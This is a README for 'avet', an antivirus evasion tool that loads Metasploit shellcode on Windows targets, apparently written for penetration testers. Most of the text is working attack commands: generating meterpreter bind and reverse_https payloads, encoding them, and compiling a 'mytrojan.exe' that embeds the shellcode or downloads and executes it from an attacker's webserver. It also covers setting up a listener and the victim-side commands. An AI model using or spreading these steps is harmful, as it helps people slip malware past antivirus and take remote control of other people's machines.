AntiVirus Evasion Tool
======================

Please note that this tool was developed based on Backtrack 5, which I still use for some things. Shellcode downloading (-u) is a bit buggy and noisy, so better use the -f switch. Unfortunately I do not have the time to enhance avet or to develop a version that is running with kali. But I think nevertheless it might be interesting for some people. 

For basics about antivirus evasion have a look at my old article: https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf

What & Why:
- when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
- avet is a antivirus evasion tool targeting windows machines
- avet includes two tools, avet.exe with different antivirus eavasion techniques and make_avet for compiling a preconfigured binary file
- avet.exe loads ASCII encoded shellcode from a textfile or from a webserver
- for encoding the shellcode the tool format.sh and sh_format are included
- Tools used: Based on Backtrack 5, wine, MinGW, metasploit. Works fine on different systems.


How to use avet.exe
-------------------

You can use the precompiled avet.exe file as a shellcode loader.

Example 1, loading shellcode from a file:

Attackers machine:
$ msfpayload windows/meterpreter/bind_tcp C > sc.txt
$ ./format.sh sc.txt > sc_clean.txt

Copy sc_clean.txt & avet.exe to the victim machine.

$ msfconsole
msf > use multi/handler
msf  exploit(handler) > set payload windows/meterpreter/bind_tcp 
msf  exploit(handler) > set rhost xyz
msf  exploit(handler) > exploit 

On the victim machine:
c:\whatever>avet.exe -f shellcode.txt


Example 2, loading shellcode from a webserver:

Attackers machine:
$ msfpayload windows/meterpreter/bind_tcp C > sc.txt
$ ./format.sh sc.txt > sc_clean.txt

Copy sc_clean.txt to your webroot and avet.exe to the victim machine.

$ msfconsole
msf > use multi/handler
msf  exploit(handler) > set payload windows/meterpreter/bind_tcp 
msf  exploit(handler) > set rhost xyz
msf  exploit(handler) > exploit 

On the victim machine:
c:\whatever>avet.exe -u yourserver/sc_clean.txt


How to use make_avet
--------------------
Compile if needed:
$ gcc -o make_avet make_avet.c

Example 1, compile shellcode into the .exe file:

$ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C > sh.txt
$ ./format.sh sh.txt > sh_clean.txt
$ ./make_avet -f sh_clean.txt
$ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o mytrojan.exe avet.c


Example 2, make an .exe file that downloads a shellcode from a webserver:

$ msfpayload windows/meterpreter/reverse_https lhost=192.168.2.112 lport=443 C > sh.txt
$ ./format.sh sh.txt > sh_clean.txt
$ cp sh_clean.txt /var/www
$ ./make_avet -u 192.168.2.112/sh_clean.txt
$ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o mytrojan.exe avet.c

Check out the other options as well:
-f compile shellcode into avet.exe, needs filename
-u load and exec shellcode from url using internet explorer
-p print debug information
-h help


Some notes
----------

Rebuild avet.exe:
No problem, ensure no content is in defs.h (echo "">defs.h), then compile with:
$ wine ~/.wine/drive_c/MinGW/bin/gcc.exe -o avet.exe avet.c

Have a look for build.sh for easier handling.
